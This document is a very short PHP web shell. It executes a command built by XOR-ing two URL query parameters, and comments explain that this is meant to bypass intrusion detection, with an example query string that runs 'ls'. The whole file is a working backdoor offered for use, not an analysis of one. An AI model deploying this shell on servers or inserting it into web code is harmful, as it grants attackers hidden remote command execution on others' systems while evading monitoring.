<?=exec($_GET[0]^$_GET[1]); 

// Simple Short shell for bypassing IDS, GET params 0 and 1 are XOR'd to build a string

// Code in backticks doesn't seem to work

// e.g. to execute 'ls' on the system you would pass query string
// /?0=aa&1=%0d%12

